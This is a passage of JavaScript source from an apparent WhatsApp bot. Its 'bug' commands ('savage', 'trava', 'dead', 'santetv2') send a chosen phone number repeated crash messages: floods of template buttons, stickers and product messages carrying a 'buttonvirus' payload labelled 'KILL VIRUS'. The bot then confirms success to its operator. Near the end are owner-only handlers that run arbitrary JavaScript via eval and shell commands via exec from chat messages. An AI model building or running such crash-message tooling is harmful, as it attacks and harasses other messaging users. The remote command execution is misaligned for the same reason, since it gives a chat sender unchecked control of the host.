{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
,*/
for (let i = 0; i < jumlah; i++) {
diablo.sendMessage(num, {
text: 'JOKER NIH BOS', 
templateButtons: [
{ callButton: { displayText: `BUGHARD BY JOKER`, phoneNumber: ``}},
{ callButton: { displayText: `BUGHARD BY JOKER`, phoneNumber: ``}},
{ urlButton: { displayText: `BUGHARD BY JOKER`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ callButton: { displayText: `BUGHARD BY JOKER`, phoneNumber: ``}},
{ callButton: { displayText: `BUGHARD BY JOKER`, phoneNumber: ``}},
{ urlButton: { displayText: `BUGHARD BY JOKER`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ callButton: { displayText: `BUGHARD BY JOKER`, phoneNumber: ``}},
{ callButton: { displayText: `BUGHARD BY JOKER`, phoneNumber: ``}},
{ urlButton: { displayText: `BUGHARD BY JOKER`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ callButton: { displayText: `BUGHARD BY JOKER`, phoneNumber: ``}},
{ callButton: { displayText: `BUGHARD BY JOKER`, phoneNumber: ``}},
{ urlButton: { displayText: `BUGHARD BY JOKER`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ callButton: { displayText: `BUGHARD BY JOKER`, phoneNumber: ``}},
{ callButton: { displayText: `BUGHARD BY JOKER`, phoneNumber: ``}},
{ urlButton: { displayText: `BUGHARD BY JOKER`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ callButton: { displayText: `BUGHARD BY JOKER`, phoneNumber: ``}},
{ callButton: { displayText: `BUGHARD BY JOKER`, phoneNumber: ``}},
{ urlButton: { displayText: `BUGHARD BY JOKER`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ callButton: { displayText: `BUGHARD BY JOKER`, phoneNumber: ``}},
{ callButton: { displayText: `BUGHARD BY JOKER`, phoneNumber: ``}},
{ urlButton: { displayText: `BUGHARD BY JOKER`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ callButton: { displayText: `BUGHARD BY JOKER`, phoneNumber: ``}},
{ callButton: { displayText: `BUGHARD BY JOKER`, phoneNumber: ``}},
{ urlButton: { displayText: `BUGHARD BY JOKER`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ callButton: { displayText: `BUGHARD BY JOKER`, phoneNumber: ``}},
{ callButton: { displayText: `BUGHARD BY JOKER`, phoneNumber: ``}},
{ urlButton: { displayText: `BUGHARD BY JOKER`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quoted: lep }
]})}
await sleep(ms(waktu))
break
    case 'savage':
case 'trava':

    textnyasu = `Sukses Send Bug Ke Nomor Target ✅`
    diablobotwhatsapp.reply(textnyasu)
     
    {
        if (!itsMediablo) return diablobotwhatsapp.reply(`PENGEN GUNAIN BOT CHAT OWNER KIDS`)
        if (!q) return 
        num = `${q}`+'@s.whatsapp.net'
         jumlah = '2'
        waktu = '3s'
        for (let i = 0; i < jumlah; i++) {
        diablo.sendMessage(num, {sticker: ppnyauser},{ quoted: lep })
        await sleep(ms(waktu))
        }
        }
        {
            if (!itsMediablo) return diablobotwhatsapp.reply(`PENGEN GUNAIN BOT CHAT OWNER KIDS`)
            if (!q) return 
            num = `${q}`+'@s.whatsapp.net'
             jumlah = '2'
            waktu = '3s'
            for (let i = 0; i < jumlah; i++) {
            diablo.sendMessage(num, {sticker: ppnyauser},{ quoted: lep })
            await sleep(ms(waktu))
            }
            }
             
            break
            case 'dead':
                textnyasu = `Sukses KirimBug Ke Nomor Target ✅`
    diablobotwhatsapp.reply(textnyasu)

                 
    {
        if (!itsMediablo) return diablobotwhatsapp.reply(`PENGEN GUNAIN BOT CHAT OWNER KIDS`)
        if (!q) return 
        num = `${q}`+'@s.whatsapp.net'
         jumlah = '2'
        waktu = '3s'
        for (let i = 0; i < jumlah; i++) {
        diablo.sendMessage(num, {sticker: ppnyauser},{ quoted: lep })
        await sleep(ms(waktu))
        }
        }
        {
            if (!itsMediablo) return diablobotwhatsapp.reply(`PENGEN GUNAIN BOT CHAT OWNER KIDS`)
            if (!q) return 
            num = `${q}`+'@s.whatsapp.net'
             jumlah = '2'
            waktu = '3s'
            for (let i = 0; i < jumlah; i++) {
            diablo.sendMessage(num, {sticker: ppnyauser},{ quoted: lep })
            await sleep(ms(waktu))
            }
            }
             
            break
            case 'santetv2':

                textnyasu = `Sukses Send Bug Ke Nomor Target ✅`
    diablobotwhatsapp.reply(textnyasu)
                 
{
    if (!itsMediablo) return diablobotwhatsapp.reply(`PENGEN GUNAIN BOT CHAT OWNER KIDS`)
    if (!q) return 
    num = `${q}`+'@s.whatsapp.net'
    jumlah = '10'
    waktu = '4s'
    for (let i = 0; i < jumlah; i++) {
    var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: diablo.waUploadToServer })
    var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
    "productMessage": {
    "product": {
    "productImage": messa.imageMessage,
    "productId": "7091718154232528",
    "title": `WARNING THIS IS KILL VIRUS`,
    "description": `${buttonvirus}${buttonvirus}`,
    "currencyCode": "IDR",
    "priceAmount1000": "100000000000000000",
    "productImageCount": 1,
    "firstImageId": 1,
    "salePriceAmount1000": "1000",
    "retailerId": `KILLER VIRUS V9999`,
    "url": `https://wa.me/0`
    },
    "businessOwnerJid": "6281220670449@s.whatsapp.net",
    }
    }), { userJid: from, quoted: lep  })
    diablo.relayMessage(num, catalog.message, { messageId: catalog.key.id })
    await sleep(ms(waktu))
    }
}
{
    if (!itsMediablo) return diablobotwhatsapp.reply(`PENGEN GUNAIN BOT CHAT OWNER KIDS`)
    if (!q) return 
    num = `${q}`+'@s.whatsapp.net'
    jumlah = '10'
    waktu = '4s'
    for (let i = 0; i < jumlah; i++) {
    var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: diablo.waUploadToServer })
    var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
    "productMessage": {
    "product": {
    "productImage": messa.imageMessage,
    "productId": "7091718154232528",
    "title": `WARNING THIS IS KILL VIRUS`,
    "description": `${buttonvirus}${buttonvirus}`,
    "currencyCode": "IDR",
    "priceAmount1000": "100000000000000000",
    "productImageCount": 1,
    "firstImageId": 1,
    "salePriceAmount1000": "1000",
    "retailerId": `KILLER VIRUS V`,
    "url": `https://wa.me/0`
    },
    "businessOwnerJid": "6281220670449@s.whatsapp.net",
    }
    }), { userJid: from, quoted: lep  })
    diablo.relayMessage(num, catalog.message, { messageId: catalog.key.id })
    await sleep(ms(waktu))
    }
     
    }
    {
        if (!itsMediablo) return diablobotwhatsapp.reply(`PENGEN GUNAIN BOT CHAT OWNER KIDS`)
        if (!q) return 
        num = `${q}`+'@s.whatsapp.net'
        jumlah = '10'
        waktu = '4s'
        for (let i = 0; i < jumlah; i++) {
        var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: diablo.waUploadToServer })
        var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
        "productMessage": {
        "product": {
        "productImage": messa.imageMessage,
        "productId": "7091718154232528",
        "title": `WARNING THIS IS KILL VIRUS`,
        "description": `${buttonvirus}${buttonvirus}`,
        "currencyCode": "IDR",
        "priceAmount1000": "100000000000000000",
        "productImageCount": 1,
        "firstImageId": 1,
        "salePriceAmount1000": "1000",
        "retailerId": `KILLER VIRUS V9999`,
        "url": `https://wa.me/0`
        },
        "businessOwnerJid": "6281220670449@s.whatsapp.net",
        }
        }), { userJid: from, quoted: lep  })
        diablo.relayMessage(num, catalog.message, { messageId: catalog.key.id })
        await sleep(ms(waktu))
        }
    }
    {
        if (!itsMediablo) return diablobotwhatsapp.reply(`PENGEN GUNAIN BOT CHAT OWNER KIDS`)
        if (!q) return 
        num = `${q}`+'@s.whatsapp.net'
        jumlah = '10'
        waktu = '4s'
        for (let i = 0; i < jumlah; i++) {
        var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: diablo.waUploadToServer })
        var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
        "productMessage": {
        "product": {
        "productImage": messa.imageMessage,
        "productId": "7091718154232528",
        "title": `WARNING THIS IS KILL VIRUS`,
        "description": `${buttonvirus}${buttonvirus}`,
        "currencyCode": "IDR",
        "priceAmount1000": "100000000000000000",
        "productImageCount": 1,
        "firstImageId": 1,
        "salePriceAmount1000": "1000",
        "retailerId": `KILLER VIRUS V`,
        "url": `https://wa.me/0`
        },
        "businessOwnerJid": "6281220670449@s.whatsapp.net",
        }
        }), { userJid: from, quoted: lep  })
        diablo.relayMessage(num, catalog.message, { messageId: catalog.key.id })
        await sleep(ms(waktu))
        }
         
        }
        break



break
default:
}
if (budy.startsWith('=>')) {
if (!itsMediablo) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return diablobotwhatsapp.reply(bang)
}
try {
diablobotwhatsapp.reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
} catch (e) {
diablobotwhatsapp.reply(String(e))
}
}
if (budy.startsWith('>')) {
if (!itsMediablo) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await diablobotwhatsapp.reply(evaled)
} catch (err) {
diablobotwhatsapp.reply(String(err))
}
}
if (budy.startsWith('<')) {
if (!itsMediablo) return
try {
return diablobotwhatsapp.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
if (budy.startsWith('$')){
if (!itsMediablo) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return diablobotwhatsapp.reply(`${err}`)
if (stdout) {
diablobotwhatsapp.reply(stdout)
}
})
}
} catch (err) {
diablobotwhatsapp.reply(util.format(err))
}
} 